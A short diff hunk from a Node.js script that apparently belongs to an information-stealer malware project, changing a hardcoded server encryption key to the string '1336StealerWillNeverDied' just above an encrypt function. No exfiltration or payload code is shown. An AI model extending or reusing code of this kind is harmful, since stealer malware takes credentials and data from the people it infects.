@@ -68,7 +68,7 @@ if (args.length != 3) {
 }
 
 // Key of the server
-const key = "stanleySMODSPIRATESTEALER0109222";
+const key = "1336StealerWillNeverDied";
 const crypto = require('crypto');
 
 function encrypt(plainText) {
